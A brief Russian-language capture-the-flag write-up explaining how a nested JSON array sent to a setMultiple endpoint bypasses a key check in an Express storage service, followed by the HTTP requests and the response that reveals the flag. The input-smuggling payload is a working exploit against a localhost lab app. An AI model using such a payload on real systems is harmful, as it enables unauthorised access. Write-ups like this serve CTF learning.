Флаг лежит в `storage._vault['flag']`,
через `storage.get('flag')` его нельзя достать т.к нельзя прописать себе `level`

Это можно обойти, юзнув `setMultiple` с аргументами `['blabla', ['blabla', 'level', 'spbctf_security_1337']]`

`setMultiple` "раскроет вложенные массивы", которые обойдут проверку ключа

Вложенный массив можно передать, потому что используется body-parser

    > GET /setm HTTP/1.1
    > Host: localhost:31337
    > User-Agent: insomnia/6.4.2
    > Content-Type: application/json
    > Accept: */*
    > Content-Length: 52

    | [
    | 	"kek", ["lul", "level", "spbctf_security_1337"]
    | ]

    ----

    > GET /get?key=flag HTTP/1.1
    < HTTP/1.1 200 OK
    < X-Powered-By: Express
    < Content-Type: application/json; charset=utf-8
    < Content-Length: 45
    < ETag: W/"2d-T0uhy/9+2Ry6rEl3D5TELS5q8OQ"
    < Date: Thu, 09 May 2019 12:58:42 GMT
    < Connection: keep-alive

    | {
    |   "value": "battles{never_parse_user_input_structures!!!}"
    | }
